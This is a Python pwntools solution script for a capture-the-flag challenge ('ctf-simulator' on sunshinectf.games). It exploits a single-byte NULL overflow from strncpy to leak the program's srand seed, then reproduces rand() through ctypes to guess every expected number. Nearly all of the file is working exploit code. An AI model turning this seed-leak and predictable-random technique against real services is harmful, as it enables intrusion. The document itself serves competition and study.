'''
vulnerability: single-byte overflow of NULL byte from strncpy at 0x14CB

exploit: leak seed value passed to srand to produce deterministic rand
    function. successfully 'guess' all of the random values that the program
    expects.
'''
from pwn import *
import ctypes

NAME = 'ctf-simulator'
PORT = 22000
URL = 'sunshinectf.games'
FLAGFILE = 'flag.txt'

TEAM_NAME = 'a' * 30


def parse_seed_from_line(line: bytes) -> int:
    toks = line.split(b' ')
    seed_tok = toks[1]
    # remove trailing comma
    seed_tok = seed_tok[:-1]
    seed = seed_tok[-4:]
    return u32(seed)


def parse_divisor_from_line(line: bytes) -> int:
    toks = line.split(b' ')
    tok = toks[10].decode('utf-8')
    tok = tok[:-1]
    return int(tok)


def test_line_for_win(line: bytes) -> int:
    toks = line.split(b' ')
    if toks[0] == b'Wow,':
        return True
    else:
        return False


def main():

    context.binary = ELF(NAME)
    # leverage the system libc to reproduce the same srand and rand functions.
    libc = ctypes.CDLL('/lib/x86_64-linux-gnu/libc.so.6')

    if args['REMOTE']:
        p = remote(URL, PORT)
    else:
        with open(FLAGFILE, 'w') as fd:
            fd.write('test-flag-value')
        p = process(context.binary.path)

    p.recvuntil(b'[>] ')
    p.sendline(TEAM_NAME.encode())
    line = p.readline()
    seed = parse_seed_from_line(line)
    print(f'seed: {seed}')
    libc.srand(seed)

    while True:
        divisor = parse_divisor_from_line(line)
        print(f'divisor: {divisor}')
        r = libc.rand() % divisor + 1
        print(f'rand: {r}')

        p.sendline(str(r).encode())

        p.recvline()
        line = p.recvline()
        if test_line_for_win(line):
            break

    print(p.recvline())


if __name__ == '__main__':
    main()
